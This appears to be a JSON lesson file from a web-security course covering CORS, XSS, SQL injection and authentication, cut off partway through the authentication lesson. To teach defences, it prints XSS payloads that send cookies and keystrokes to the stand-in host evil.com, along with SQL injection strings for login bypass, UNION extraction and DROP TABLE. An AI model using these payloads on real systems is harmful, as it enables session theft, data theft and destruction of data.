{
  "module": {
    "id": "security-basics",
    "title": "Security Basics",
    "description": "Learn essential web security concepts and how to protect your applications",
    "icon": "Shield",
    "requiredXp": 2800,
    "color": "from-rose-400 to-rose-600",
    "courseId": "auth-security"
  },
  "lessons": [
    {
      "id": "cors-explained",
      "moduleId": "security-basics",
      "title": "CORS Explained",
      "order": 1,
      "difficulty": "beginner",
      "content": "# Essential to know\n- CORS = Cross-Origin Resource Sharing\n- Browsers block requests from one domain to another by default\n- CORS headers tell browsers which origins are allowed\n- Security feature to prevent malicious sites from accessing your API\n\n---\n\n# CORS: Why Can't My Frontend Talk to My API?\n\n## The Problem\n\nYou build:\n- Frontend: `http://localhost:3000`\n- Backend API: `http://localhost:4000`\n\nYou try to fetch data:\n```javascript\nfetch('http://localhost:4000/api/users')\n```\n\n**Error:**\n```\nAccess to fetch has been blocked by CORS policy\n```\n\nü§î Why?\n\n## What is CORS?\n\n**CORS** = Cross-Origin Resource Sharing\n\nIt's a **browser security feature** that blocks requests between different origins.\n\n**Same Origin:**\n```\nhttps://example.com/page1\nhttps://example.com/page2  ‚Üê Same! ‚úÖ\n```\n\n**Different Origin (Cross-Origin):**\n```\nhttp://localhost:3000      (frontend)\nhttp://localhost:4000      (backend) ‚Üê Different! ‚ùå\n\nhttps://myapp.com\nhttps://api.myapp.com      ‚Üê Different subdomain! ‚ùå\n\nhttp://example.com\nhttps://example.com        ‚Üê Different protocol! ‚ùå\n```\n\n## Why Does CORS Exist?\n\n**Without CORS:**\n\nYou visit `evil-site.com`. It secretly runs:\n```javascript\nfetch('https://yourbank.com/transfer', {\n  method: 'POST',\n  body: JSON.stringify({ to: 'hacker', amount: 1000 })\n});\n```\n\nSince you're logged into your bank, your session cookies are sent!\n\n**With CORS:**\n\nBrowser checks: \"Does yourbank.com allow evil-site.com?\"\n\nBank server: \"No!\"\n\nBrowser: **Blocks the request** ‚úÖ\n\n## How CORS Works\n\n### Simple Requests\n\n**1. Browser sends request with Origin header:**\n```http\nGET /api/users HTTP/1.1\nHost: api.example.com\nOrigin: http://localhost:3000\n```\n\n**2. Server responds with CORS header:**\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://localhost:3000\n```\n\n**3. Browser sees match:**\n\"localhost:3000 is allowed!\" ‚Üí Request succeeds ‚úÖ\n\n### Preflight Requests\n\nFor complex requests (POST, PUT, DELETE, custom headers), browser sends a **preflight** first:\n\n**1. Browser sends OPTIONS request:**\n```http\nOPTIONS /api/users HTTP/1.1\nOrigin: http://localhost:3000\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type\n```\n\n**2. Server responds:**\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://localhost:3000\nAccess-Control-Allow-Methods: POST, GET, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type\n```\n\n**3. If allowed:**\nBrowser sends the actual POST request.\n\n## Enabling CORS in Your API\n\n### Node.js/Express\n\n**Option 1: Allow specific origin**\n```javascript\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');\n  res.header('Access-Control-Allow-Headers', 'Content-Type');\n  next();\n});\n```\n\n**Option 2: Use cors package**\n```javascript\nconst cors = require('cors');\n\n// Allow all origins (development only!)\napp.use(cors());\n\n// Allow specific origin (production)\napp.use(cors({\n  origin: 'https://myapp.com'\n}));\n```\n\n### Common CORS Headers\n\n**Access-Control-Allow-Origin**\n```\nAccess-Control-Allow-Origin: https://myapp.com\nAccess-Control-Allow-Origin: *  ‚Üê Allow all (not recommended!)\n```\n\n**Access-Control-Allow-Methods**\n```\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\n```\n\n**Access-Control-Allow-Headers**\n```\nAccess-Control-Allow-Headers: Content-Type, Authorization\n```\n\n**Access-Control-Allow-Credentials**\n```\nAccess-Control-Allow-Credentials: true  ‚Üê Allow cookies\n```\n\n**Access-Control-Max-Age**\n```\nAccess-Control-Max-Age: 86400  ‚Üê Cache preflight for 24 hours\n```\n\n## CORS Best Practices\n\n‚úÖ **Development:** Allow `localhost:3000`\n```javascript\napp.use(cors({ origin: 'http://localhost:3000' }));\n```\n\n‚úÖ **Production:** Allow your specific domain\n```javascript\napp.use(cors({ origin: 'https://myapp.com' }));\n```\n\n‚ùå **DON'T:** Use `*` with credentials\n```javascript\n// WRONG! Security risk!\napp.use(cors({ origin: '*', credentials: true }));\n```\n\n‚úÖ **Multiple origins:** Use whitelist\n```javascript\nconst allowedOrigins = [\n  'https://myapp.com',\n  'https://staging.myapp.com',\n  'http://localhost:3000'\n];\n\napp.use(cors({\n  origin: (origin, callback) => {\n    if (allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  }\n}));\n```\n\n## Debugging CORS Issues\n\n**Error: \"No 'Access-Control-Allow-Origin' header\"**\n- Your server isn't sending CORS headers\n- Add CORS middleware\n\n**Error: \"Origin not allowed\"**\n- Your origin isn't in the whitelist\n- Check the `Access-Control-Allow-Origin` value\n\n**Error: \"Credential is not supported\"**\n- Can't use `origin: '*'` with `credentials: true`\n- Use specific origin\n\n**Preflight fails:**\n- Server must respond to OPTIONS requests\n- Check `Access-Control-Allow-Methods` includes your method\n\n## CORS Alternatives\n\n**Proxy during development:**\n```javascript\n// In frontend package.json\n{\n  \"proxy\": \"http://localhost:4000\"\n}\n\n// Now fetch('/api/users') works without CORS!\n```\n\n**Same domain in production:**\n- Frontend: `https://myapp.com`\n- Backend: `https://myapp.com/api`\n- No CORS needed! Same origin.",
      "codeExample": "// Complete CORS setup example\n\nconst express = require('express');\nconst cors = require('cors');\nconst app = express();\n\n// Environment-based CORS configuration\nconst corsOptions = {\n  origin: function (origin, callback) {\n    // Allow requests with no origin (mobile apps, Postman)\n    if (!origin) return callback(null, true);\n    \n    const allowedOrigins = [\n      'https://myapp.com',\n      'https://www.myapp.com',\n      'https://staging.myapp.com'\n    ];\n    \n    // In development, allow localhost\n    if (process.env.NODE_ENV === 'development') {\n      allowedOrigins.push('http://localhost:3000');\n    }\n    \n    if (allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true,  // Allow cookies\n  optionsSuccessStatus: 200\n};\n\napp.use(cors(corsOptions));\n\n// Your routes\napp.get('/api/users', (req, res) => {\n  res.json({ users: ['Alice', 'Bob'] });\n});\n\napp.listen(4000);\n\n// ---\n// Manual CORS (without package)\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  const allowedOrigins = ['http://localhost:3000', 'https://myapp.com'];\n  \n  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n  }\n  \n  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  \n  // Handle preflight\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(200);\n  }\n  \n  next();\n});"
    },
    {
      "id": "xss-prevention",
      "moduleId": "security-basics",
      "title": "XSS and Prevention",
      "order": 2,
      "difficulty": "beginner",
      "content": "# Essential to know\n- XSS = Cross-Site Scripting (code injection attack)\n- Attacker injects malicious JavaScript into your site\n- Can steal cookies, session tokens, user data\n- Prevent by sanitizing user input and escaping output\n\n---\n\n# XSS: When Users Inject Code\n\n## What is XSS?\n\n**XSS** (Cross-Site Scripting) = Injecting malicious JavaScript into a website.\n\n**Example attack:**\n\nUser posts a comment:\n```html\n<img src=\"x\" onerror=\"alert('Hacked!')\">\n```\n\nIf your site displays this without escaping:\n```html\n<div>{comment}</div>\n<!-- Becomes: -->\n<div><img src=\"x\" onerror=\"alert('Hacked!')\"></div>\n```\n\nThe JavaScript runs! üí•\n\n**Real attack:**\n```javascript\n<script>\n  // Steal cookies\n  fetch('https://evil.com/steal?cookie=' + document.cookie);\n</script>\n```\n\nAttacker now has your session token!\n\n## Types of XSS\n\n### 1. Stored XSS (Persistent)\n\nMalicious script is **saved in database**.\n\n**Example:**\n1. Attacker posts comment with `<script>` tag\n2. Saved to database\n3. Every user who views the page runs the script\n\n**Most dangerous!** Affects all users.\n\n### 2. Reflected XSS\n\nMalicious script is in the **URL** and reflected back.\n\n**Example URL:**\n```\nhttps://example.com/search?q=<script>alert('XSS')</script>\n```\n\nPage displays:\n```html\n<p>Results for: <script>alert('XSS')</script></p>\n```\n\nScript executes!\n\n**Attack:** Attacker sends victims a malicious link.\n\n### 3. DOM-based XSS\n\nClient-side JavaScript processes user input unsafely.\n\n```javascript\n// VULNERABLE!\nconst name = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').innerHTML = 'Hello ' + name;\n```\n\n**Attack URL:**\n```\nhttps://example.com?name=<img src=x onerror=\"alert('XSS')\">\n```\n\n## How to Prevent XSS\n\n### 1. Escape Output (Most Important!)\n\n**React/Vue/Angular:** Automatic!\n\n```jsx\n// React escapes by default ‚úÖ\nfunction Comment({ text }) {\n  return <div>{text}</div>;\n}\n\n// This is SAFE:\n<Comment text=\"<script>alert('XSS')</script>\" />\n// Displays: <script>alert('XSS')</script> (as text)\n```\n\n**Plain HTML:** Use a library\n\n```javascript\n// DOMPurify library\nconst clean = DOMPurify.sanitize(userInput);\ndiv.innerHTML = clean;\n```\n\n**Manual escaping:**\n```javascript\nfunction escapeHtml(text) {\n  const map = {\n    '&': '&amp;',\n    '<': '&lt;',\n    '>': '&gt;',\n    '\"': '&quot;',\n    \"'\": '&#x27;'\n  };\n  return text.replace(/[&<>\"']/g, m => map[m]);\n}\n\n// Usage\nconst safe = escapeHtml(userInput);\ndiv.innerHTML = safe;\n```\n\n### 2. Use textContent, Not innerHTML\n\n```javascript\n// VULNERABLE ‚ùå\ndiv.innerHTML = userInput;\n\n// SAFE ‚úÖ\ndiv.textContent = userInput;\n```\n\n`textContent` treats everything as text, never as HTML.\n\n### 3. Sanitize Rich Text\n\nIf you need to allow some HTML (like bold, italic):\n\n```javascript\nimport DOMPurify from 'dompurify';\n\n// Allow only safe tags\nconst clean = DOMPurify.sanitize(userInput, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n  ALLOWED_ATTR: ['href']\n});\n\ndiv.innerHTML = clean;\n```\n\n### 4. Content Security Policy (CSP)\n\nHTTP header that blocks inline scripts:\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\nThis prevents:\n- Inline `<script>` tags\n- `onclick` handlers\n- `javascript:` URLs\n\nOnly scripts from your domain run.\n\n**In Express:**\n```javascript\nconst helmet = require('helmet');\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\"]\n  }\n}));\n```\n\n### 5. HttpOnly Cookies\n\nMake session cookies inaccessible to JavaScript:\n\n```javascript\nres.cookie('sessionId', token, {\n  httpOnly: true,  // Can't access via document.cookie\n  secure: true,    // Only send over HTTPS\n  sameSite: 'strict'\n});\n```\n\nEven if XSS happens, attacker can't steal the cookie!\n\n### 6. Validate Input\n\n**Server-side validation:**\n```javascript\nfunction validateUsername(username) {\n  // Only allow letters, numbers, underscore\n  if (!/^[a-zA-Z0-9_]+$/.test(username)) {\n    throw new Error('Invalid username');\n  }\n  return username;\n}\n```\n\n## Real-World XSS Examples\n\n**Stealing session:**\n```html\n<script>\nfetch('https://evil.com/steal', {\n  method: 'POST',\n  body: document.cookie\n});\n</script>\n```\n\n**Keylogger:**\n```html\n<script>\ndocument.addEventListener('keypress', e => {\n  fetch('https://evil.com/log?key=' + e.key);\n});\n</script>\n```\n\n**Phishing:**\n```html\n<script>\ndocument.body.innerHTML = '<h1>Session Expired</h1><form action=\"https://evil.com\">...</form>';\n</script>\n```\n\n## Testing for XSS\n\n**Common payloads:**\n```html\n<script>alert('XSS')</script>\n<img src=x onerror=\"alert('XSS')\">\n<svg onload=\"alert('XSS')\">\n<iframe src=\"javascript:alert('XSS')\">\n```\n\nTry entering these in forms, URLs, etc.\n\n**Automated tools:**\n- OWASP ZAP\n- Burp Suite\n- XSStrike\n\n## XSS Prevention Checklist\n\n‚úÖ Use React/Vue/Angular (auto-escaping)\n‚úÖ Never use `innerHTML` with user input\n‚úÖ Use `textContent` instead\n‚úÖ Sanitize rich text with DOMPurify\n‚úÖ Implement Content Security Policy\n‚úÖ Use HttpOnly cookies\n‚úÖ Validate input server-side\n‚úÖ Escape output everywhere\n‚úÖ Test with XSS payloads",
      "codeExample": "// XSS Prevention Examples\n\n// 1. React component - SAFE by default ‚úÖ\nfunction UserComment({ comment }) {\n  // React escapes {comment} automatically\n  return <div className=\"comment\">{comment.text}</div>;\n}\n\n// 2. Dangerous HTML - use sanitizer\nimport DOMPurify from 'dompurify';\n\nfunction RichComment({ comment }) {\n  // User can use bold, italic, etc.\n  const cleanHtml = DOMPurify.sanitize(comment.html, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],\n    ALLOWED_ATTR: []\n  });\n  \n  return (\n    <div \n      className=\"rich-comment\"\n      dangerouslySetInnerHTML={{ __html: cleanHtml }}\n    />\n  );\n}\n\n// 3. Manual escaping (vanilla JS)\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#039;\");\n}\n\n// VULNERABLE ‚ùå\ndocument.getElementById('output').innerHTML = userInput;\n\n// SAFE ‚úÖ\ndocument.getElementById('output').textContent = userInput;\n\n// SAFE with escaping ‚úÖ\ndocument.getElementById('output').innerHTML = escapeHtml(userInput);\n\n// 4. Server-side: Express with helmet\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\n// Set security headers including CSP\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"]\n    }\n  }\n}));\n\n// Set HttpOnly cookies\napp.post('/login', (req, res) => {\n  const token = generateToken(user);\n  res.cookie('sessionToken', token, {\n    httpOnly: true,   // Not accessible via JS\n    secure: true,     // HTTPS only\n    sameSite: 'strict',\n    maxAge: 3600000\n  });\n  res.json({ success: true });\n});\n\n// Validate and sanitize input\napp.post('/comment', (req, res) => {\n  let { text } = req.body;\n  \n  // Validate\n  if (text.length > 500) {\n    return res.status(400).json({ error: 'Too long' });\n  }\n  \n  // Server-side sanitization (defense in depth)\n  text = escapeHtml(text);\n  \n  // Save to database\n  db.saveComment({ text });\n  res.json({ success: true });\n});"
    },
    {
      "id": "sql-injection",
      "moduleId": "security-basics",
      "title": "SQL Injection",
      "order": 3,
      "difficulty": "beginner",
      "content": "# Essential to know\n- SQL injection = Inserting malicious SQL into queries\n- Can read, modify, or delete entire database\n- Prevent by using parameterized queries (prepared statements)\n- Never concatenate user input into SQL strings\n\n---\n\n# SQL Injection: Don't Trust User Input\n\n## What is SQL Injection?\n\n**SQL Injection** = Inserting malicious SQL code into a query.\n\n**Vulnerable code:**\n```javascript\nconst username = req.body.username;\nconst query = `SELECT * FROM users WHERE username = '${username}'`;\ndb.query(query);\n```\n\n**Normal input:**\n```\nusername: \"alice\"\nQuery: SELECT * FROM users WHERE username = 'alice'\n```\n‚úÖ Works fine.\n\n**Malicious input:**\n```\nusername: \"alice' OR '1'='1\"\nQuery: SELECT * FROM users WHERE username = 'alice' OR '1'='1'\n```\n\nüí• **Returns ALL users!** The `OR '1'='1'` is always true.\n\n## Real Attack Examples\n\n### 1. Bypass Login\n\n**Vulnerable login:**\n```javascript\nconst query = `\n  SELECT * FROM users \n  WHERE username = '${username}' \n  AND password = '${password}'\n`;\n```\n\n**Attack:**\n```\nusername: admin\npassword: ' OR '1'='1\n\nQuery becomes:\nSELECT * FROM users \nWHERE username = 'admin' \nAND password = '' OR '1'='1'\n```\n\nThe `OR '1'='1'` makes it always true ‚Üí **Logged in as admin!** üí•\n\n### 2. Delete Database\n\n**Vulnerable search:**\n```javascript\nconst query = `SELECT * FROM products WHERE name = '${searchTerm}'`;\n```\n\n**Attack:**\n```\nsearchTerm: \"'; DROP TABLE users; --\"\n\nQuery becomes:\nSELECT * FROM products WHERE name = ''; \nDROP TABLE users; \n--'\n```\n\nüí• **Entire users table deleted!**\n\n### 3. Steal Data\n\n**Attack using UNION:**\n```\nsearchTerm: \"' UNION SELECT username, password FROM users --\"\n\nQuery becomes:\nSELECT * FROM products WHERE name = '' \nUNION SELECT username, password FROM users --'\n```\n\nüí• **All usernames and passwords exposed!**\n\n## How to Prevent SQL Injection\n\n### 1. Parameterized Queries (Best Practice)\n\n**Use placeholders instead of concatenation:**\n\n**Node.js (PostgreSQL):**\n```javascript\n// SAFE ‚úÖ\nconst query = 'SELECT * FROM users WHERE username = $1';\nconst values = [username];\nconst result = await db.query(query, values);\n```\n\n**Node.js (MySQL):**\n```javascript\n// SAFE ‚úÖ\nconst query = 'SELECT * FROM users WHERE username = ?';\nconnection.query(query, [username], (err, results) => {\n  // ...\n});\n```\n\n**Python:**\n```python\n# SAFE ‚úÖ\ncursor.execute('SELECT * FROM users WHERE username = %s', (username,))\n```\n\n**Why it works:**\nThe database treats the parameter as **data**, never as SQL code.\n\nEven `\"admin' OR '1'='1\"` is treated as a literal string to match.\n\n### 2. ORMs (Automatic Protection)\n\n**Sequelize (Node.js):**\n```javascript\n// SAFE ‚úÖ\nconst user = await User.findOne({\n  where: { username: username }\n});\n```\n\n**Prisma:**\n```javascript\n// SAFE ‚úÖ\nconst user = await prisma.user.findUnique({\n  where: { username: username }\n});\n```\n\n**TypeORM:**\n```javascript\n// SAFE ‚úÖ\nconst user = await userRepository.findOne({\n  where: { username }\n});\n```\n\nORMs use parameterized queries internally.\n\n### 3. Input Validation\n\n**Validate format:**\n```javascript\nfunction validateUsername(username) {\n  // Only alphanumeric and underscore\n  if (!/^[a-zA-Z0-9_]+$/.test(username)) {\n    throw new Error('Invalid username');\n  }\n  return username;\n}\n```\n\n**Whitelist allowed values:**\n```javascript\nconst allowedSortColumns = ['name', 'date', 'price'];\n\nif (!allowedSortColumns.includes(sortBy)) {\n  throw new Error('Invalid sort column');\n}\n\n// Now safe to use in ORDER BY\nconst query = `SELECT * FROM products ORDER BY ${sortBy}`;\n```\n\n### 4. Escape Input (Last Resort)\n\nIf you MUST use dynamic SQL:\n\n```javascript\nconst mysql = require('mysql');\n\n// Escape the input\nconst safe = mysql.escape(username);\nconst query = `SELECT * FROM users WHERE username = ${safe}`;\n```\n\n**But parameterized queries are better!**\n\n### 5. Principle of Least Privilege\n\n**Database user permissions:**\n```sql\n-- App's database user should NOT be able to:\nDROP TABLE\nCREATE TABLE\nGRANT permissions\n\n-- Only allow:\nSELECT\nINSERT\nUPDATE\nDELETE (on specific tables)\n```\n\nEven if SQL injection happens, attacker can't drop tables.\n\n## Vulnerable vs Safe Examples\n\n### ‚ùå VULNERABLE\n```javascript\n// String concatenation\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\ndb.query(query);\n\n// Template literal\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\ndb.query(query);\n\n// Dynamic column/table names\nconst query = `SELECT * FROM ${tableName}`;\ndb.query(query);\n```\n\n### ‚úÖ SAFE\n```javascript\n// Parameterized query\nconst query = 'SELECT * FROM users WHERE id = $1';\ndb.query(query, [userId]);\n\n// ORM\nconst user = await User.findOne({ where: { email } });\n\n// Whitelisted table name\nconst allowed = ['users', 'products'];\nif (!allowed.includes(tableName)) throw new Error();\nconst query = `SELECT * FROM ${tableName}`;\ndb.query(query);\n```\n\n## Testing for SQL Injection\n\n**Test inputs:**\n```\n' OR '1'='1\n' OR 1=1--\nadmin'--\n' UNION SELECT NULL--\n'; DROP TABLE users--\n```\n\nTry these in:\n- Login forms\n- Search boxes\n- URL parameters\n- Any user input!\n\n**Tools:**\n- SQLMap (automated testing)\n- Burp Suite\n\n## SQL Injection Prevention Checklist\n\n‚úÖ Use parameterized queries (prepared statements)\n‚úÖ Use an ORM (Sequelize, Prisma, TypeORM)\n‚úÖ Validate input (whitelist patterns)\n‚úÖ Escape input if dynamic SQL is unavoidable\n‚úÖ Use least privilege for database users\n‚úÖ Never display raw error messages to users\n‚úÖ Keep database separate from web server\n‚úÖ Regular security audits\n\n## Why It's Serious\n\n**Real breaches:**\n- Heartland Payment Systems (2008) - 130 million credit cards stolen\n- Sony Pictures (2011) - 1 million accounts\n- Yahoo (2012) - 450,000 passwords\n\n**All preventable with parameterized queries!**",
      "codeExample": "// SQL Injection: Vulnerable vs Safe Examples\n\n// ‚ùå VULNERABLE - String concatenation\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  \n  // NEVER DO THIS!\n  const query = `\n    SELECT * FROM users \n    WHERE username = '${username}' \n    AND password = '${password}'\n  `;\n  \n  const user = await db.query(query);\n  // Attacker can use: username=\"admin' --\" to bypass\n});\n\n// ‚úÖ SAFE - Parameterized query (PostgreSQL)\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  \n  const query = `\n    SELECT * FROM users \n    WHERE username = $1 \n    AND password = $2\n  `;\n  \n  const result = await db.query(query, [username, password]);\n  const user = result.rows[0];\n});\n\n// ‚úÖ SAFE - Using ORM (Prisma)\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  \n  const user = await prisma.user.findUnique({\n    where: { username }\n  });\n  \n  if (user && await bcrypt.compare(password, user.passwordHash)) {\n    // Login success\n  }\n});\n\n// ‚ùå VULNERABLE - Dynamic column name\napp.get('/users', async (req, res) => {\n  const { sortBy } = req.query;  // sortBy could be \"name; DROP TABLE users--\"\n  \n  const query = `SELECT * FROM users ORDER BY ${sortBy}`;\n  const users = await db.query(query);\n});\n\n// ‚úÖ SAFE - Whitelist allowed columns\napp.get('/users', async (req, res) => {\n  const { sortBy } = req.query;\n  \n  const allowedColumns = ['name', 'email', 'created_at'];\n  if (!allowedColumns.includes(sortBy)) {\n    return res.status(400).json({ error: 'Invalid sort column' });\n  }\n  \n  // Now safe to use\n  const query = `SELECT * FROM users ORDER BY ${sortBy}`;\n  const result = await db.query(query);\n});\n\n// ‚úÖ SAFE - Input validation\nfunction validateUsername(username) {\n  // Only allow alphanumeric and underscore\n  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {\n    throw new Error('Invalid username format');\n  }\n  return username;\n}\n\napp.post('/register', async (req, res) => {\n  try {\n    const username = validateUsername(req.body.username);\n    const query = 'INSERT INTO users (username) VALUES ($1)';\n    await db.query(query, [username]);\n  } catch (error) {\n    res.status(400).json({ error: error.message });\n  }\n});\n\n// Complete safe example with Sequelize ORM\nconst { Sequelize, DataTypes } = require('sequelize');\nconst sequelize = new Sequelize('database', 'username', 'password');\n\nconst User = sequelize.define('User', {\n  username: DataTypes.STRING,\n  email: DataTypes.STRING\n});\n\napp.get('/search', async (req, res) => {\n  const { query } = req.query;\n  \n  // Sequelize uses parameterized queries automatically\n  const users = await User.findAll({\n    where: {\n      username: {\n        [Sequelize.Op.like]: `%${query}%`\n      }\n    }\n  });\n  \n  res.json(users);\n});"
    },
    {
      "id": "auth-vs-authz",
      "moduleId": "security-basics",
      "title": "Authentication vs Authorization",
      "order": 4,
      "difficulty": "beginner",
      "content": "# Essential to know\n- Authentication = Verifying WHO you are (login)\n- Authorization = Checking WHAT you can do (permissions)\n- Auth happens first, authz second\n- Use tokens (JWT) or sessions to maintain auth state\n\n---\n\n# Authentication vs Authorization\n\n## The Difference\n\n**Authentication (AuthN):** WHO are you?\n```\nUsername: alice\nPassword: ********\n\nSystem: \"Yes, you are Alice.\" ‚úÖ\n```\n\n**Authorization (AuthZ):** WHAT can you do?\n```\nAlice tries to delete Bob's account.\n\nSystem checks: \"Is Alice an admin?\"\nNo ‚Üí \"Access denied!\" ‚ùå\n```\n\n**Analogy:**\n- **Authentication** = Showing your ID at airport security\n- **Authorization** = Your ticket determines which lounge you can access\n\n## Authentication Methods\n\n### 1. Password-Based\n\n**Standard login:**\n```javascript\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // 1. Find user\n  const user = await db.findUserByEmail(email);\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  // 2. Verify password\n  const valid = await bcrypt.compare(password, user.passwordHash);\n  if (!valid) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  // 3. Create session/token\n  const token = jwt.sign({ userId: user.id }, SECRET);\n  res.json({ token });\n});\n```\n\n**Password best practices:**\n- ‚úÖ Hash with bcrypt/argon2 (never store plain text!)\n- ‚úÖ Minimum 8 characters\n- ‚úÖ Rate limit login attempts\n- ‚úÖ Use 2FA for sensitive accounts\n\n### 2. Token-Based (JWT)\n\n**How it works:**\n1. User logs in\n2. Server creates a signed token\n3. Client stores token (localStorage/cookie)\n4. Client sends token with each request\n5. Server verifies token\n\n**Token structure:**\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n**Decoded:**\n```json\n{\n  \"userId\": 123,\n  \"email\": \"alice@example.com\",\n  \"role\": \"user\",\n  \"exp\": 1699999999\n}\n```\n\n### 3. Session-Based\n\n**How it works:**\n1. User logs in\n2. Server creates session, stores in database/Redis\n3. Server sends session ID as cookie\n4. Client sends cookie with each request\n5. Server looks up session\n\n```javascript\napp.use(session({\n  secret: 'your-secret',\n  resave: false,\n  saveUninitialized: false,\n  cookie: { \n    secure: true,\n    httpOnly: true,\n    maxAge: 3600000 // 1 hour\n  }\n}));\n\napp.post('/login', (req, res) => {\n  // Verify credentials...\n  req.session.userId = user.id;\n  res.json({ success: true });\n});\n```\n\n### 4. OAuth (Third-Party)\n\n**\"Sign in with Google/GitHub/Facebook\"**\n\n```javascript\n// Using Passport.js\npassport.use(new GoogleStrategy({\n  clientID: GOOGLE_CLIENT_ID,\n  clientSecret: GOOGLE_CLIENT_SECRET,\n  callbackURL: '/auth/google/callback'\n}, (accessToken, refreshToken, profile, done) => {\n  // Find or create user\n  User.findOrCreate({ googleId: profile.id }, (err, user) => {\n    return done(err, user);\n  });\n}));\n\napp.get('/auth/google', \n  passport.authenticate('google', { scope: ['profile', 'email'] })\n);\n```\n\n## Authorization Methods\n\n### 1. Role-Based Access Control (RBAC)\n\n**Users have roles, roles have permissions.**\n\n```javascript\nconst roles = {\n  user: ['read'],\n  editor: ['read', 'write'],\n  admin: ['read', 'write', 'delete']\n};\n\nfunction authorize(requiredPermission) {\n  return (req, res, next) => {\n    const userRole = req.user.role;\n    const permissions = roles[userRole];\n    \n    if (permissions.includes(requiredPermission)) {\n      next();\n    } else {\n      res.status(403).json({ error: 'Forbidden' });\n    }\n  };\n}\n\n// Usage\napp.delete('/posts/:id', \n  authenticate,\n  authorize('delete'),\n  deletePost\n);\n```\n\n### 2. Resource-Based Authorization\n\n**Check if user owns the resource:**\n\n```javascript\napp.put('/posts/:id', authenticate, async (req, res) => {\n  const post = await db.getPost(req.params.id);\n  \n  // Check ownership\n  if (post.authorId !== req.user.id) {\n    return res.status(403).json({ error: 'Not your post!' });\n  }\n  \n  // Update post\n  await db.updatePost(req.params.id, req.body);\n  res.json({ success: true });\n});\n```\n\n### 3. Attribute-Based Access Control (ABAC)\n\n**Complex rules based on attributes:**\n\n```javascript\nfunction canEditDocument(user, document) {\n  return (\n    user.id === document.authorId ||  // Owner\n    user.role === 'admin' ||           // Admin\n    (user.department === document.department && user.role === 'manager')  // Manager in same dept\n  );\n}\n\napp.put('/documents/:id', authenticate, async (req, res) => {\n  const doc = await db.getDocument(req.params.id);\n  \n  if (!canEditDocument(req.user, doc)) {\n    return res.status(403).json({ error: 'Access denied' });\n  }\n  \n  // Update document\n});\n```\n\n## Middleware Pattern\n\n```javascript\n// Authentication middleware\nfunction authenticate(req, res, next) {\n  const token = req.headers.authorization?.split(' ')[1];\n  \n  if (!token) {\n    return res.status(401).json({ error: 'Not authenticated' });\n  }\n  \n  try {\n    const decoded = jwt.verify(token, SECRET);\n    req.user = decoded;\n    next();\n  } catch (error) {\n    res.status(401).json({ error: 'Invalid token' });\n  }\n}\n\n// Authorization middleware\nfunction requireRole(role) {\n  return (req, res, next) => {\n    if (req.user.role !== role) {\n      return res.status(403).json({ error: 'Insufficient permissions' });\n    }\n    next();\n  };\n}\n\n// Usage\napp.get('/users', authenticate, (req, res) => {\n  // Any authenticated user\n});\n\napp.delete('/users/:id', authenticate, requireRole('admin'), (req, res) => {\n  // Admin only\n});\n```\n\n## HTTP Status Codes\n\n**401 Unauthorized** (should be \"Unauthenticated\")\n- You're not logged in\n- Token missing/invalid/expired\n\n**403 Forbidden**\n- You're logged in\n- But you don't have permission\n\n**Example:**\n```\nGET /admin/users\nNo token ‚Üí 401 Unauthorized\nUser token ‚Üí 403 Forbidden (not admin)\nAdmin token ‚Üí 200 OK\n```\n\n## Security Best Practices\n\n‚úÖ **Hash passwords** with bcrypt/argon2\n‚úÖ **Use HTTPS** (always!)\n‚úÖ **HttpOnly cookies** for tokens\n‚úÖ **Short token expiry** (15-60 minutes)\n‚úÖ **Refresh tokens** for longer sessions\n‚úÖ **Rate limiting** on login endpoints\n‚úÖ **2FA** for sensitive accounts\n‚úÖ **Log security events**\n‚úÖ **Validate on server** (never trust client)\n\n## Common 